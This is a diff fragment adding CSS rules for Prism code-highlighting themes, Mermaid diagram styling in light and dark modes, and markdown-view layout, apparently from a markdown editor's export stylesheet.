+      .prism-kimbie-light .prism .token.attr-value,
+      .prism-kimbie-light .prism .token.builtin,
+      .prism-kimbie-light .prism .token.char,
+      .prism-kimbie-light .prism .token.inserted,
+      .prism-kimbie-light .prism .token.selector,
+      .prism-kimbie-light .prism .token.string {
+        color: #889b4a;
+      }
+      .prism-kimbie-light .prism .token.attr-name {
+        color: #f06431;
+      }
+      .prism-kimbie-light .prism .language-css .token.string,
+      .prism-kimbie-light .prism .style .token.string,
+      .prism-kimbie-light .prism .token.entity,
+      .prism-kimbie-light .prism .token.operator,
+      .prism-kimbie-light .prism .token.url {
+        color: #889b4a;
+      }
+      .prism-kimbie-light .prism .token.atrule,
+      .prism-kimbie-light .prism .token.function,
+      .prism-kimbie-light .prism .token.keyword {
+        color: #98676a;
+      }
+      .prism-kimbie-light .prism .token.important,
+      .prism-kimbie-light .prism .token.variable {
+        color: #e90;
+      }
+      .prism-kimbie-light .prism .token.bold,
+      .prism-kimbie-light .prism .token.important {
+        font-weight: 500;
+      }
+      .prism-kimbie-light .prism .token.italic {
+        font-style: italic;
+      }
+      .prism-kimbie-light .prism .token.class-name {
+        color: #f06431;
+      }
+      .prism-tomorrow-night-eighties .prism {
+        color: #ccc;
+        background: #2d2d2d;
+      }
+      .prism-tomorrow-night-eighties .prism * {
+        font:
+          400 14px Source Code Pro,
+          DejaVu Sans Mono,
+          Ubuntu Mono,
+          Anonymous Pro,
+          Droid Sans Mono,
+          Menlo,
+          Monaco,
+          Consolas,
+          Inconsolata,
+          Courier,
+          monospace,
+          PingFang SC,
+          Microsoft YaHei,
+          sans-serif !important;
+      }
+      .prism-tomorrow-night-eighties .prism .token.cdata,
+      .prism-tomorrow-night-eighties .prism .token.comment,
+      .prism-tomorrow-night-eighties .prism .token.prolog {
+        color: #999;
+      }
+      .prism-tomorrow-night-eighties .prism .token.doctype {
+        color: #f99157;
+      }
+      .prism-tomorrow-night-eighties .prism .token.comment {
+        font-style: italic !important;
+      }
+      .prism-tomorrow-night-eighties .prism .token.italic,
+      dfn {
+        font-style: italic;
+      }
+      .prism-tomorrow-night-eighties .prism .token.punctuation {
+        color: #999;
+      }
+      .prism-tomorrow-night-eighties .prism .token.boolean,
+      .prism-tomorrow-night-eighties .prism .token.constant,
+      .prism-tomorrow-night-eighties .prism .token.deleted,
+      .prism-tomorrow-night-eighties .prism .token.number,
+      .prism-tomorrow-night-eighties .prism .token.property,
+      .prism-tomorrow-night-eighties .prism .token.regex,
+      .prism-tomorrow-night-eighties .prism .token.symbol {
+        color: #f99157;
+      }
+      .prism-tomorrow-night-eighties .prism .token.tag {
+        color: #f2777a;
+      }
+      .prism-tomorrow-night-eighties .prism .token.attr-value,
+      .prism-tomorrow-night-eighties .prism .token.builtin,
+      .prism-tomorrow-night-eighties .prism .token.char,
+      .prism-tomorrow-night-eighties .prism .token.inserted,
+      .prism-tomorrow-night-eighties .prism .token.selector,
+      .prism-tomorrow-night-eighties .prism .token.string {
+        color: #9c9;
+      }
+      .prism-tomorrow-night-eighties .prism .token.attr-name {
+        color: #fc6;
+      }
+      .prism-tomorrow-night-eighties .prism .language-css .token.string,
+      .prism-tomorrow-night-eighties .prism .style .token.string,
+      .prism-tomorrow-night-eighties .prism .token.entity,
+      .prism-tomorrow-night-eighties .prism .token.operator,
+      .prism-tomorrow-night-eighties .prism .token.url {
+        color: #9c9;
+      }
+      .prism-tomorrow-night-eighties .prism .token.atrule,
+      .prism-tomorrow-night-eighties .prism .token.keyword {
+        color: #c9c;
+      }
+      .prism-tomorrow-night-eighties .prism .token.function {
+        color: #69c;
+      }
+      .prism-tomorrow-night-eighties .prism .token.important,
+      .prism-tomorrow-night-eighties .prism .token.variable {
+        color: #e90;
+      }
+      .prism-tomorrow-night-eighties .prism .token.bold,
+      .prism-tomorrow-night-eighties .prism .token.important {
+        font-weight: 500;
+      }
+      .prism-tomorrow-night-eighties .prism .tocken.class-name {
+        color: #e6c07b;
+      }
+      pre.line-numbers {
+        position: relative;
+        padding-left: 3.8em;
+        counter-reset: c;
+      }
+      pre.line-numbers > code {
+        position: relative;
+        white-space: inherit;
+      }
+      .line-numbers .line-numbers-rows {
+        position: absolute;
+        pointer-events: none;
+        top: 0;
+        font-size: 100%;
+        left: -3.8em;
+        width: 3em;
+        letter-spacing: -1px;
+        border-right: 1px solid #999;
+        -webkit-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+      }
+      .line-numbers-rows > span {
+        pointer-events: none;
+        display: block;
+        counter-increment: c;
+      }
+      .line-numbers-rows > span:before {
+        content: counter(c);
+        color: #999;
+        display: block;
+        padding-right: 0.8em;
+        text-align: right;
+      }
+      audio,
+      canvas,
+      progress,
+      video {
+        display: inline-block;
+      }
+      .app--dark .mermaid div.mermaidTooltip,
+      .mermaid div.mermaidTooltip {
+        position: absolute;
+        max-width: 200px;
+        padding: 2px;
+        pointer-events: none;
+        z-index: 100;
+      }
+      .mermaid-svg .grid .tick text {
+        font-size: 14px;
+      }
+      .mermaid {
+        font-size: 16px;
+      }
+      button,
+      hr,
+      input {
+        overflow: visible;
+      }
+      .mermaid svg {
+        color: rgba(0, 0, 0, 0.75);
+        width: 100%;
+      }
+      .app--dark .mermaid svg {
+        color: hsla(0, 0%, 100%, 0.75);
+      }
+      .mermaid .mermaid .label {
+        color: #333;
+      }
+      .mermaid .node circle,
+      .mermaid .node ellipse,
+      .mermaid .node polygon,
+      .mermaid .node rect {
+        fill: #eee;
+        stroke: #999;
+        stroke-width: 1px;
+      }
+      .mermaid .edgePath .path {
+        stroke: #666;
+        stroke-width: 1.5px;
+      }
+      .mermaid .edgeLabel {
+        background-color: #fff;
+      }
+      .mermaid .cluster rect {
+        fill: #eaf2fb !important;
+        rx: 4 !important;
+        stroke: #26a !important;
+        stroke-width: 1px !important;
+      }
+      .mermaid .cluster text {
+        fill: #333;
+      }
+      .mermaid .actor {
+        stroke: #999;
+        fill: #eee;
+      }
+      .mermaid text.actor {
+        fill: #333;
+        stroke: none;
+      }
+      .mermaid .actor-line {
+        stroke: #666;
+      }
+      .mermaid .messageLine0,
+      .mermaid .messageLine1 {
+        stroke-width: 1.5;
+        stroke-dasharray: "2 2";
+        stroke: #333;
+      }
+      .mermaid #arrowhead {
+        fill: #333;
+      }
+      .mermaid #crosshead path {
+        fill: #333 !important;
+        stroke: #333 !important;
+      }
+      .mermaid .messageText {
+        fill: #333;
+        stroke: none;
+      }
+      .mermaid .labelBox {
+        stroke: #999;
+        fill: #eee;
+      }
+      .mermaid .labelText,
+      .mermaid .loopText {
+        fill: #fff;
+        stroke: none;
+      }
+      .mermaid .loopLine {
+        stroke-width: 2;
+        stroke-dasharray: "2 2";
+        stroke: #999;
+      }
+      .mermaid .note {
+        stroke: #770;
+        fill: #ffa;
+      }
+      .mermaid .noteText {
+        fill: #000;
+        stroke: none;
+        font-family: Arial, Helvetica, sans-serif;
+        font-size: 14px;
+      }
+      .mermaid .section {
+        stroke: none;
+        opacity: 0.2;
+      }
+      .mermaid .section0,
+      .mermaid .section2 {
+        fill: #d2d8e2;
+      }
+      .mermaid .section1,
+      .mermaid .section3 {
+        fill: #fff;
+        opacity: 0.2;
+      }
+      .mermaid .sectionTitle0,
+      .mermaid .sectionTitle1,
+      .mermaid .sectionTitle2,
+      .mermaid .sectionTitle3 {
+        fill: #333;
+      }
+      .mermaid .sectionTitle {
+        text-anchor: start;
+        font-size: 11px;
+      }
+      .mermaid .grid .tick {
+        stroke: #dddfe4;
+        opacity: 0.3;
+        shape-rendering: crispEdges;
+      }
+      .mermaid .grid path {
+        stroke-width: 0;
+      }
+      .mermaid .today {
+        fill: none;
+        stroke: #d42;
+        stroke-width: 2px;
+      }
+      .mermaid .task {
+        stroke-width: 2;
+      }
+      .mermaid .taskText {
+        text-anchor: middle;
+        font-size: 10px;
+      }
+      .mermaid .taskTextOutsideRight {
+        fill: #333;
+        text-anchor: start;
+        font-size: 11px;
+      }
+      .mermaid .taskTextOutsideLeft {
+        fill: #333;
+        text-anchor: end;
+        font-size: 11px;
+      }
+      .mermaid .taskText0,
+      .mermaid .taskText1,
+      .mermaid .taskText2,
+      .mermaid .taskText3 {
+        fill: #4d4d4d;
+      }
+      .mermaid .task0,
+      .mermaid .task1,
+      .mermaid .task2,
+      .mermaid .task3 {
+        fill: #ffe4c2;
+      }
+      .mermaid .taskTextOutside0,
+      .mermaid .taskTextOutside1,
+      .mermaid .taskTextOutside2,
+      .mermaid .taskTextOutside3 {
+        fill: #4d4d4d;
+      }
+      .mermaid .active0,
+      .mermaid .active1,
+      .mermaid .active2,
+      .mermaid .active3 {
+        fill: #add6f7;
+      }
+      .mermaid .activeText0,
+      .mermaid .activeText1,
+      .mermaid .activeText2,
+      .mermaid .activeText3 {
+        fill: #4d4d4d !important;
+      }
+      .mermaid .done0,
+      .mermaid .done1,
+      .mermaid .done2,
+      .mermaid .done3 {
+        fill: #c2e0f9;
+        stroke-width: 2;
+      }
+      .mermaid .doneText0,
+      .mermaid .doneText1,
+      .mermaid .doneText2,
+      .mermaid .doneText3 {
+        fill: #4d4d4d !important;
+      }
+      .mermaid .crit0,
+      .mermaid .crit1,
+      .mermaid .crit2,
+      .mermaid .crit3 {
+        fill: #ffcf94;
+        stroke-width: 2;
+      }
+      .mermaid .activeCrit0,
+      .mermaid .activeCrit1,
+      .mermaid .activeCrit2,
+      .mermaid .activeCrit3 {
+        fill: #f88f95;
+        stroke-width: 2;
+      }
+      .mermaid .doneCrit0,
+      .mermaid .doneCrit1,
+      .mermaid .doneCrit2,
+      .mermaid .doneCrit3 {
+        fill: #fcc7ca;
+        stroke-width: 2;
+        cursor: pointer;
+      }
+      .mermaid .doneCritText0,
+      .mermaid .doneCritText1,
+      .mermaid .doneCritText2,
+      .mermaid .doneCritText3 {
+        fill: #4d4d4d !important;
+      }
+      .mermaid .activeCritText0,
+      .mermaid .activeCritText1,
+      .mermaid .activeCritText2,
+      .mermaid .activeCritText3 {
+        fill: #333 !important;
+      }
+      .mermaid .titleText {
+        text-anchor: middle;
+        font-size: 16px;
+        fill: #3d3d3d;
+        font-weight: 700;
+      }
+      .mermaid g.classGroup text {
+        fill: #999;
+        stroke: none;
+        font-family:
+          trebuchet ms,
+          verdana,
+          arial;
+        font-size: 10px;
+      }
+      .mermaid g.classGroup rect {
+        fill: #eee;
+        stroke: #999;
+      }
+      .mermaid g.classGroup line {
+        stroke: #999;
+        stroke-width: 1;
+      }
+      .mermaid svg .classLabel .box {
+        stroke: none;
+        stroke-width: 0;
+        fill: #eee;
+        opacity: 0.5;
+      }
+      .mermaid svg .classLabel .label {
+        fill: #999;
+        font-size: 10px;
+      }
+      .mermaid .relation {
+        stroke: #999;
+        stroke-width: 1;
+        fill: none;
+      }
+      .mermaid #compositionEnd,
+      .mermaid #compositionStart,
+      .mermaid .composition {
+        fill: #999;
+        stroke: #999;
+        stroke-width: 1;
+      }
+      .mermaid #aggregationEnd,
+      .mermaid #aggregationStart,
+      .mermaid .aggregation {
+        fill: #eee;
+        stroke: #999;
+        stroke-width: 1;
+      }
+      .mermaid #dependencyEnd,
+      .mermaid #dependencyStart,
+      .mermaid #extensionEnd,
+      .mermaid #extensionStart {
+        fill: #999;
+        stroke: #999;
+        stroke-width: 1;
+      }
+      .mermaid .node text {
+        font-family: Arial, Helvetica, sans-serif;
+        font-size: 14px;
+      }
+      .mermaid div.mermaidTooltip {
+        text-align: center;
+        font-family: Arial, Helvetica, sans-serif;
+        font-size: 12px;
+        background: #eaf2fb;
+        border: 1px solid #26a;
+        border-radius: 2px;
+      }
+      .app--dark .mermaid .label {
+        color: #323d47;
+      }
+      .app--dark .mermaid .node circle,
+      .app--dark .mermaid .node ellipse,
+      .app--dark .mermaid .node polygon,
+      .app--dark .mermaid .node rect {
+        fill: #bdd5ea;
+        stroke: #81b1db;
+        stroke-width: 1px;
+      }
+      .app--dark .mermaid .edgePath .path {
+        stroke: #d3d3d3;
+      }
+      .app--dark .mermaid .edgeLabel {
+        background-color: #e8e8e8;
+      }
+      .app--dark .mermaid .cluster rect {
+        fill: #6d6d65 !important;
+        rx: 4 !important;
+        stroke: hsla(0, 0%, 100%, 0.25) !important;
+        stroke-width: 1px !important;
+      }
+      .app--dark .mermaid .cluster text {
+        fill: #f9fffe;
+      }
+      .app--dark .mermaid .actor {
+        stroke: #81b1db;
+        fill: #bdd5ea;
+      }
+      .app--dark .mermaid text.actor {
+        fill: #000;
+        stroke: none;
+      }
+      .app--dark .mermaid .actor-line {
+        stroke: #d3d3d3;
+      }
+      .app--dark .mermaid .messageLine0,
+      .app--dark .mermaid .messageLine1 {
+        stroke-width: 1.5;
+        stroke-dasharray: "2 2";
+        stroke: #d3d3d3;
+      }
+      .app--dark .mermaid #arrowhead {
+        fill: #d3d3d3 !important;
+      }
+      .app--dark .mermaid #crosshead path {
+        fill: #d3d3d3 !important;
+        stroke: #d3d3d3 !important;
+      }
+      .app--dark .mermaid .messageText {
+        fill: #d3d3d3;
+        stroke: none;
+      }
+      .app--dark .mermaid .labelBox {
+        stroke: #81b1db;
+        fill: #bdd5ea;
+      }
+      .app--dark .mermaid .labelText {
+        fill: #323d47;
+        stroke: none;
+      }
+      .app--dark .mermaid .loopText {
+        fill: #d3d3d3;
+        stroke: none;
+      }
+      .app--dark .mermaid .loopLine {
+        stroke-width: 2;
+        stroke-dasharray: "2 2";
+        stroke: #81b1db;
+      }
+      .app--dark .mermaid .note {
+        stroke: hsla(0, 0%, 100%, 0.25);
+        fill: #fff5ad;
+      }
+      .app--dark .mermaid .noteText {
+        fill: #000;
+        stroke: none;
+        font-family:
+          trebuchet ms,
+          verdana,
+          arial;
+        font-size: 14px;
+      }
+      .app--dark .mermaid .section {
+        stroke: none;
+        opacity: 0.2;
+      }
+      .app--dark .mermaid .section0 {
+        fill: hsla(0, 0%, 100%, 0.3);
+      }
+      .app--dark .mermaid .section2 {
+        fill: #eae8b9;
+      }
+      .app--dark .mermaid .section1,
+      .app--dark .mermaid .section3 {
+        fill: #fff;
+        opacity: 0.2;
+      }
+      .app--dark .mermaid .sectionTitle0,
+      .app--dark .mermaid .sectionTitle1,
+      .app--dark .mermaid .sectionTitle2,
+      .app--dark .mermaid .sectionTitle3 {
+        fill: #f9fffe;
+      }
+      .app--dark .mermaid .sectionTitle {
+        text-anchor: start;
+        font-size: 11px;
+      }
+      .app--dark .mermaid .grid .tick {
+        stroke: hsla(0, 0%, 100%, 0.3);
+        opacity: 0.3;
+        shape-rendering: crispEdges;
+      }
+      .app--dark .mermaid .grid .tick text {
+        fill: #d3d3d3;
+        opacity: 0.5;
+      }
+      .app--dark .mermaid .grid path {
+        stroke-width: 0;
+      }
+      .app--dark .mermaid .today {
+        fill: none;
+        stroke: #db5757;
+        stroke-width: 2px;
+      }
+      .app--dark .mermaid .task {
+        stroke-width: 1;
+      }
+      .app--dark .mermaid .taskText {
+        text-anchor: middle;
+        font-size: 11px;
+      }
+      .app--dark .mermaid .taskTextOutsideRight {
+        fill: #323d47;
+        text-anchor: start;
+        font-size: 11px;
+      }
+      .app--dark .mermaid .taskTextOutsideLeft {
+        fill: #323d47;
+        text-anchor: end;
+        font-size: 11px;
+      }
+      .app--dark .mermaid .taskText0,
+      .app--dark .mermaid .taskText1,
+      .app--dark .mermaid .taskText2,
+      .app--dark .mermaid .taskText3 {
+        fill: #323d47;
+      }
+      .app--dark .mermaid .task0,
+      .app--dark .mermaid .task1,
+      .app--dark .mermaid .task2,
+      .app--dark .mermaid .task3 {
+        fill: #bdd5ea;
+        stroke: hsla(0, 0%, 100%, 0.5);
+      }
+      .app--dark .mermaid .taskTextOutside0,
+      .app--dark .mermaid .taskTextOutside1,
+      .app--dark .mermaid .taskTextOutside2,
+      .app--dark .mermaid .taskTextOutside3 {
+        fill: #d3d3d3;
+      }
+      .app--dark .mermaid .active0,
+      .app--dark .mermaid .active1,
+      .app--dark .mermaid .active2,
+      .app--dark .mermaid .active3 {
+        fill: #81b1db;
+        stroke: hsla(0, 0%, 100%, 0.5);
+      }
+      .app--dark .mermaid .activeText0,
+      .app--dark .mermaid .activeText1,
+      .app--dark .mermaid .activeText2,
+      .app--dark .mermaid .activeText3 {
+        fill: #323d47 !important;
+      }
+      .app--dark .mermaid .done0,
+      .app--dark .mermaid .done1,
+      .app--dark .mermaid .done2,
+      .app--dark .mermaid .done3 {
+        fill: #d3d3d3;
+      }
+      .app--dark .mermaid .doneText0,
+      .app--dark .mermaid .doneText1,
+      .app--dark .mermaid .doneText2,
+      .app--dark .mermaid .doneText3 {
+        fill: #323d47 !important;
+      }
+      .app--dark .mermaid .crit0,
+      .app--dark .mermaid .crit1,
+      .app--dark .mermaid .crit2,
+      .app--dark .mermaid .crit3 {
+        stroke: #e83737;
+        fill: #e83737;
+        stroke-width: 2;
+      }
+      .app--dark .mermaid .activeCrit0,
+      .app--dark .mermaid .activeCrit1,
+      .app--dark .mermaid .activeCrit2,
+      .app--dark .mermaid .activeCrit3 {
+        stroke: #e83737;
+        fill: #81b1db;
+        stroke-width: 2;
+      }
+      .app--dark .mermaid .doneCrit0,
+      .app--dark .mermaid .doneCrit1,
+      .app--dark .mermaid .doneCrit2,
+      .app--dark .mermaid .doneCrit3 {
+        stroke: #e83737;
+        fill: #d3d3d3;
+        stroke-width: 1;
+        cursor: pointer;
+        shape-rendering: crispEdges;
+      }
+      .app--dark .mermaid .doneCritText0,
+      .app--dark .mermaid .doneCritText1,
+      .app--dark .mermaid .doneCritText2,
+      .app--dark .mermaid .doneCritText3 {
+        fill: #d3d3d3 !important;
+      }
+      .app--dark .mermaid .activeCritText0,
+      .app--dark .mermaid .activeCritText1,
+      .app--dark .mermaid .activeCritText2,
+      .app--dark .mermaid .activeCritText3 {
+        fill: #323d47 !important;
+      }
+      .app--dark .mermaid .titleText {
+        text-anchor: middle;
+        font-size: 18px;
+        fill: #d3d3d3;
+      }
+      .app--dark .mermaid .node text {
+        font-family:
+          trebuchet ms,
+          verdana,
+          arial;
+        font-size: 14px;
+      }
+      .app--dark .mermaid div.mermaidTooltip {
+        text-align: center;
+        font-family:
+          trebuchet ms,
+          verdana,
+          arial;
+        font-size: 12px;
+        background: #6d6d65;
+        border: 1px solid hsla(0, 0%, 100%, 0.25);
+        border-radius: 2px;
+      }
+      html {
+        -ms-text-size-adjust: 100%;
+        -webkit-text-size-adjust: 100%;
+      }
+      article,
+      aside,
+      details,
+      figcaption,
+      figure,
+      footer,
+      header,
+      main,
+      menu,
+      nav,
+      section {
+        display: block;
+      }
+      h1 {
+        font-size: 2em;
+        margin: 0.67em 0;
+      }
+      figure {
+        margin: 1em 40px;
+      }
+      hr {
+        box-sizing: content-box;
+        height: 0;
+      }
+      .markdown_views *,
+      legend {
+        box-sizing: border-box;
+      }
+      code,
+      kbd,
+      pre,
+      samp {
+        font-family: monospace, monospace;
+        font-size: 1em;
+      }
+      a {
+        background-color: transparent;
+        -webkit-text-decoration-skip: objects;
+      }
+      abbr[title] {
+        border-bottom: none;
+        text-decoration: underline;
+        text-decoration: underline dotted;
+      }
+      b,
+      strong {
+        font-weight: inherit;
+        font-weight: bolder;
+      }
+      mark {
+        background-color: #ff0;
+        color: #000;
+      }
+      small {
+        font-size: 80%;
+      }
+      sub,
+      sup {
+        font-size: 75%;
+        line-height: 0;
+        position: relative;
+      }
+      sub {
+        bottom: -0.25em;
+      }
+      sup {
+        top: -0.5em;
+      }
+      audio:not([controls]) {
+        display: none;
+        height: 0;
+      }
+      img {
+        border-style: none;
+      }
+      svg:not(:root) {
+        overflow: hidden;
+      }
+      button,
+      input,
+      optgroup,
+      select,
+      textarea {
+        font-family: sans-serif;
+        font-size: 100%;
+        line-height: 1.15;
+        margin: 0;
+      }
+      button,
+      select {
+        text-transform: none;
+      }
+      [type="reset"],
+      [type="submit"],
+      button,
+      html [type="button"] {
+        -webkit-appearance: button;
+      }
+      [type="button"]::-moz-focus-inner,
+      [type="reset"]::-moz-focus-inner,
+      [type="submit"]::-moz-focus-inner,
+      button::-moz-focus-inner {
+        border-style: none;
+        padding: 0;
+      }
+      [type="button"]:-moz-focusring,
+      [type="reset"]:-moz-focusring,
+      [type="submit"]:-moz-focusring,
+      button:-moz-focusring {
+        outline: ButtonText dotted 1px;
+      }
+      [type="checkbox"],
+      [type="radio"] {
+        box-sizing: border-box;
+        padding: 0;
+      }
+      [type="number"]::-webkit-inner-spin-button,
+      [type="number"]::-webkit-outer-spin-button {
+        height: auto;
+      }
+      [type="search"] {
+        -webkit-appearance: textfield;
+        outline-offset: -2px;
+      }
+      [type="search"]::-webkit-search-cancel-button,
+      [type="search"]::-webkit-search-decoration {
+        -webkit-appearance: none;
+      }
+      ::-webkit-file-upload-button {
+        -webkit-appearance: button;
+        font: inherit;
+      }
+      .markdown_views,
+      body,
+      html {
+        font-family:
+          -apple-system,
+          SF UI Text,
+          Arial,
+          PingFang SC,
+          Hiragino Sans GB,
+          Microsoft YaHei,
+          WenQuanYi Micro Hei,
+          sans-serif;
+        -webkit-font-smoothing: antialiased;
+      }
+      fieldset {
+        padding: 0.35em 0.75em 0.625em;
+      }
+      legend {
+        display: table;
+        max-width: 100%;
+        padding: 0;
+        color: inherit;
+        white-space: normal;
+      }
+      summary {
+        display: list-item;
+      }
+      [hidden],
+      template {
+        display: none;
+      }
+      body,
+      html {
+        color: rgba(0, 0, 0, 0.75);
+        font-variant-ligatures: common-ligatures;
+        line-height: 1.625;
+        -moz-osx-font-smoothing: grayscale;
+        tab-size: 4;
+        -moz-tab-size: 4;
+        -o-tab-size: 4;
+      }
+      .app--dark .layout__panel--editor,
+      .app--dark .layout__panel--preview {
+        color: hsla(0, 0%, 100%, 0.75);
+      }
+      .markdown_views blockquote,
+      .markdown_views dl,
+      .markdown_views ol,
+      .markdown_views p,
+      .markdown_views pre,
+      .markdown_views ul {
+        margin: 1.2em 0;
+      }
+      .markdown_views ol ol,
+      .markdown_views ol ul,
+      .markdown_views ul ol,
+      .markdown_views ul ul {
+        margin: 0;
+      }
+      .markdown_views dt {
+        font-weight: 700;
+      }
+      .markdown_views code *,
+      .markdown_views pre *,
+      .markdown_views samp * {
+        font-size: inherit;
+      }
+      .markdown_views blockquote {
+        color: rgba(0, 0, 0, 0.5);
+        padding-left: 1.5em;
+      }
+      .app--dark .layout__panel--editor .markdown_views blockquote,
+      .app--dark .layout__panel--preview .markdown_views blockquote {
+        color: hsla(0, 0%, 100%, 0.4);
+        border-left-color: hsla(0, 0%, 100%, 0.075);
+      }
+      .markdown_views code {
+        padding: 2px 4px;
+      }
+      .markdown_views pre > code {
+        background-color: rgba(0, 0, 0, 0.05);
+        display: block;
+        padding: 0.5em;
+        -webkit-text-size-adjust: none;
+        overflow-x: auto;
+        white-space: pre;
+      }
+      .markdown_views .toc ul {
+        list-style-type: none;
+        padding-left: 20px;
+      }
+      .markdown_views table {
+        background-color: transparent;
+        border-spacing: 0;
+      }
+      .markdown_views td,
+      .markdown_views th {
+        border-right: 1px solid #dcdcdc;
+        padding: 8px 12px;
+      }
+      .markdown_views td {
+        border-top: 1px solid #dcdcdc;
+      }
+      .markdown_views mark {
+        background-color: #f8f840;
+      }
+      .markdown_views abbr[title] {
+        cursor: help;
+      }
+      .markdown_views img[src*="#pic_center"] {
+        display: block;
+        margin: auto;
+      }
+      .markdown_views img[src*="#pic_right"] {
+        display: block;
+        margin: auto 0 auto auto;
+      }
+      .markdown_views .task-list-item {
+        list-style-type: none;
+      }
+      .markdown_views .task-list-item p {
+        overflow: unset;
+      }
+      .markdown_views .task-list-item-checkbox {
+        margin: 0 0.2em 0 -1.3em;
+      }
+      .markdown_views .page-break-after {
+        page-break-after: always;
+      }
+      .markdown_views .stackedit__html {
+        margin-bottom: 180px;
+        margin-left: auto;
+        margin-right: auto;
+        padding-left: 30px;
+        padding-right: 30px;
+        max-width: 750px;
+      }
+      .markdown_views .stackedit__toc ul {
+        padding: 0;
+      }
+      .markdown_views .stackedit__toc ul a {
+        margin: 0.5rem 0;
+        padding: 0.5rem 1rem;
+      }
+      .markdown_views .stackedit__toc ul ul {
+        color: #888;
+        font-size: 0.9em;
+      }
+      .markdown_views .stackedit__toc ul ul a {
+        margin: 0;
+        padding: 0.1rem 1rem;
+      }
+      .markdown_views .stackedit__toc li {
+        display: block;
+      }
+      .markdown_views .stackedit__toc a {
+        display: block;
+        color: inherit;
+        text-decoration: none;
+      }
+      .markdown_views .stackedit__toc a:active,
+      .markdown_views .stackedit__toc a:focus,
+      .markdown_views .stackedit__toc a:hover {
+        background-color: rgba(0, 0, 0, 0.075);
+        border-radius: 4px;
+      }
+      .markdown_views .stackedit__left {
+        position: fixed;
+        display: none;
+        width: 250px;
+        height: 100%;
+        top: 0;
+        left: 0;
+        overflow-x: hidden;
+        overflow-y: auto;
+        -webkit-overflow-scrolling: touch;
+        -ms-overflow-style: none;
+      }
+      .markdown_views .stackedit__right {
+        position: absolute;
+        right: 0;
+        top: 0;
+        left: 0;
+      }
+      @media (min-width: 1060px) {
+        .markdown_views .stackedit__left {
+          display: block;
+        }
+        .markdown_views .stackedit__right {
+          left: 250px;
+        }
+      }
+      .markdown_views .stackedit--pdf blockquote {
+        border-left-color: #ececec;
+      }
+      .markdown_views .stackedit--pdf .stackedit__html {
+        padding-left: 0;
+        padding-right: 0;
+        max-width: none;
+      }
+      .markdown_views {
+        word-break: break-word !important;
+        -moz-osx-font-smoothing: antialiased;
+        font-variant-ligatures: no-common-ligatures;
+      }
+      .markdown_views p {
+        font-size: 16px;
+        color: #4d4d4d;
+        font-weight: 400;
+        line-height: 26px;
+        margin: 0 0 16px;
+        overflow: hidden;
+        overflow-x: auto;
+      }
+      .markdown_views strong {
+        font-weight: 700;
+      }
+      .markdown_views i,
+      address,
+      cite,
+      dfn,
+      em,
+      var {
+        font-style: italic;
+      }
+      .markdown_views h1,
+      .markdown_views h2,
+      .markdown_views h3,
+      .markdown_views h4,
+      .markdown_views h5,
+      .markdown_views h6 {
+        color: #4f4f4f;
+        margin: 24px 0 8px;
+        font-weight: 600;
+      }
+      .markdown_views ol,
+      .markdown_views ul {
+        margin: 0 0 24px;
+        padding: 0;
+        font-size: 16px;
+        overflow: hidden;
+        overflow-x: auto;
+      }
+      .markdown_views ol,
+      .markdown_views ol > li {
+        list-style-type: decimal !important;
+      }
+      .markdown_views ul,
+      .markdown_views ul > li {
+        list-style-type: disc;
+      }
+      .markdown_views ol ul,
+      .markdown_views ol ul > li,
+      .markdown_views ul ul,
+      .markdown_views ul ul li {
+        list-style-type: circle;
+      }
+      .markdown_views ol ol,
+      .markdown_views ol ol > li,
+      .markdown_views ol ul ul,
+      .markdown_views ol ul ul > li,
+      .markdown_views ul ol,
+      .markdown_views ul ol > li,
+      .markdown_views ul ul ul,
+      .markdown_views ul ul ul li {
+        list-style-type: square;
+      }
+      .markdown_views li {
+        margin: 8px 0 0 32px;
+      }
+      .markdown_views p > img {
+        max-width: 100%;
+        margin: 0;
+      }
+      .markdown_views img {
+        margin: 24px 0;
+        max-width: 100%;
+      }
+      .markdown_views h1 {
+        font-size: 22px;
+        line-height: 32px;
+      }
+      .markdown_views h2 {
+        font-size: 20px;
+        line-height: 30px;
+      }
+      .markdown_views h3 {
+        font-size: 18px;
+        line-height: 28px;
+      }
+      .markdown_views h4 {
+        font-size: 16px;
+        line-height: 26px;
+      }
+      .markdown_views h5,
+      .markdown_views h6 {
+        font-size: 16px;
+        line-height: 24px;
+      }
+      .markdown_views h1 code {
+        font-size: 28px;
+      }
+      .markdown_views h2 code {
+        font-size: 24px;
+      }
+      .markdown_views h3 code {
+        font-size: 22px;
+      }
+      .markdown_views h4 code {
+        font-size: 20px;
+      }
+      .markdown_views h5 code {
+        font-size: 18px;
+      }
+      .markdown_views h6 code {
+        font-size: 16px;
+      }
+      .markdown_views blockquote {
+        display: block;
+        padding: 16px;
+        margin: 0 0 24px;
+        border-left: 8px solid #dddfe4;
+        background: #eef0f4;
+        overflow: auto;
+        word-break: break-word !important;
+      }
+      .markdown_views blockquote ol,
+      .markdown_views blockquote ul {
+        margin-bottom: 0;
+        padding: 0;
+        font-size: 14px;
+        line-height: 22px;
+      }
+      .markdown_views blockquote ol li,
+      .markdown_views blockquote ul li {
+        margin-bottom: 0;
+      }
+      .markdown_views blockquote p {
+        font-size: 14px;
+        line-height: 22px;
+        color: #555666;
+        font-weight: 400;
+        margin-bottom: 0;
+      }
+      .markdown_views hr {
+        margin: 24px 0;
+        border: none;
+        border-bottom: 1px solid #ddd;
+      }
+      .markdown_views table tr {
+        border: 0;
+        border-top: 1px solid #ddd;
+        background-color: #fff;
+      }
+      .markdown_views table {
+        border-collapse: collapse;
+        display: table;
+        width: 100%;
+        text-align: center;
+        margin-bottom: 24px;
+      }
+      .markdown_views tbody {
+        border: 0;
+      }
+      .markdown_views table tr:nth-child(2n) {
+        background-color: #f7f7f7;
+      }
+      .markdown_views table tr td,
+      .markdown_views table tr th {
+        font-size: 14px;
+        color: #4f4f4f;
+        line-height: 22px;
+        border: 1px solid #ddd;
+        padding: 8px;
+        word-break: normal !important;
+        vertical-align: middle;
+      }
+      .markdown_views table tr td code,
+      .markdown_views table tr th code {
+        white-space: normal;
+        word-break: normal !important;
+      }
+      .markdown_views table tr th {
+        font-weight: 700;
+        background-color: #eff3f5;
+      }
+      .markdown_views dl {
+        margin: 24px;
+      }
+      .markdown_views dl dt {
+        margin: 8px;
+        font-weight: 700;
+      }
+      .markdown_views dl dt dd {
+        margin: 8px;
+      }
+      .markdown_views abbr[data-original-title],
+      .markdown_views abbr[title] {
+        cursor: help;
+        border-bottom: 1px dotted #999;
+      }
+      .markdown_views .initialism {
+        font-size: 90%;
+        text-transform: uppercase;
+      }
+      .markdown_views pre {
+        margin-bottom: 24px;
+      }
